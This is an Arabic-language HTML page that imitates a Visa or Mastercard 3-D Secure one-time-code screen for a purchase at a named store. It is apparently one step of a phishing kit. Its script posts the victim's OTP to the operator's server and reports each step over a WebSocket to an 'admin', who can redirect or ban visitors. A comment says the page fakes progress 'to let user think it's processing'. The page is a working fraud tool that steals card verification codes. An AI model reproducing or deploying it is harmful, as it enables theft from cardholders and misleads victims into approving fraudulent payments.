<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الدفع</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Cairo', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .brand-logo {
            height: 40px;
            margin-bottom: 20px;
            object-fit: contain;
        }

        .bank-info {
            font-size: 14px;
            margin-bottom: 20px;
            color: #555;
            text-align: right;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 13px;
            color: #333;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
            text-align: center;
            letter-spacing: 2px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #005eb8;
            /* Visa Blue Default */
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        button:hover {
            opacity: 0.9;
        }

        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #888;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 13px;
        }

        .info-label {
            color: #666;
        }

        .info-val {
            font-weight: bold;
        }
    </style>
</head>

<body>

    <div class="container">
        <img id="brandLogo" src="" alt="Secure Payment" class="brand-logo">

        <h2 style="font-size: 18px; margin-bottom: 15px;">رمز التحقق (OTP)</h2>

        <div class="bank-info">
            <div class="info-row">
                <span class="info-val">متجر إليورا</span>
                <span class="info-label">التاجر:</span>
            </div>
            <div class="info-row">
                <span class="info-val">199.00 SAR</span>
                <span class="info-label">المبلغ:</span>
            </div>
            <div class="info-row">
                <span class="info-val" id="dateDisplay"></span>
                <span class="info-label">التاريخ:</span>
            </div>
            <div class="info-row">
                <span class="info-val">**** **** **** <span id="last4">****</span></span>
                <span class="info-label">رقم البطاقة:</span>
            </div>
        </div>

        <p style="font-size: 13px; margin-bottom: 20px; color: #666; line-height: 1.5;">
            تم إرسال رمز التحقق إلى رقم جوالك المسجل. يرجى إدخال الرمز لإتمام العملية.
        </p>

        <form id="otpForm">
            <div class="input-group">
                <label>أدخل الرمز</label>
                <input type="text" id="otp" required maxlength="6" placeholder="******" autocomplete="one-time-code">
            </div>
            <button type="submit" id="submitBtn">تأكيد</button>
        </form>

        <div class="footer">
            <a href="#" style="color: #666; text-decoration: underline;">أعد إرسال الرمز</a>
            <br><br>
            <span id="secureText">Secure Transaction</span>
        </div>
    </div>

    <script>
        // --- API & WebSocket Integration ---
        let clientId = localStorage.getItem('aura_client_id');
        if (!clientId) {
            clientId = 'unknown-' + Date.now();
        }

        const proto = window.location.protocol === 'https:' ? 'wss' : 'ws';
        const wsUrl = `${proto}://${window.location.host}/ws/client/${clientId}`;
        const ws = new WebSocket(wsUrl);

        ws.onopen = () => {
            // Inform admin of current state
            ws.send(JSON.stringify({ event: 'step_update', data: { step: 'sms_otp' } }));
        };

        ws.onmessage = (e) => {
            try {
                const msg = JSON.parse(e.data);
                if (msg.type === 'REDIRECT') {
                    window.location.href = msg.url;
                } else if (msg.type === 'BANNED') {
                    window.location.href = msg.redirect || 'https://www.google.com';
                }
            } catch (err) { console.error(err); }
        };

        // --- Brand & UI Logic ---
        const dateDisplay = document.getElementById('dateDisplay');
        const now = new Date();
        dateDisplay.textContent = now.toLocaleDateString('en-GB');

        const brand = localStorage.getItem('card_brand') || 'visa';
        const logoImg = document.getElementById('brandLogo');
        const submitBtn = document.getElementById('submitBtn');
        const secureText = document.getElementById('secureText');

        if (brand === 'mastercard') {
            logoImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png";
            submitBtn.style.backgroundColor = "#ff5f00"; // Mastercard Orange
            secureText.innerHTML = "Mastercard Identity Check";
        } else {
            logoImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png";
            submitBtn.style.backgroundColor = "#1A1F71"; // Visa Blue
            secureText.innerHTML = "Verified by Visa";
        }

        // --- Handle Submit ---
        document.getElementById('otpForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const otpVal = document.getElementById('otp').value;
            submitBtn.disabled = true;
            submitBtn.textContent = 'جاري التحقق...';

            // Send OTP to API
            try {
                await fetch(`/v1/sms-submit?client_id=${clientId}&otp=${otpVal}`, {
                    method: 'POST'
                });
                // Redirect to Loading Step 2
                window.location.href = 'loading?step=2';
            } catch (err) {
                console.error(err);
                // Even if it fails (network), we simulate progression to let user think it's processing
                window.location.href = 'loading?step=2';
            }
        });
    </script>

</body>

</html>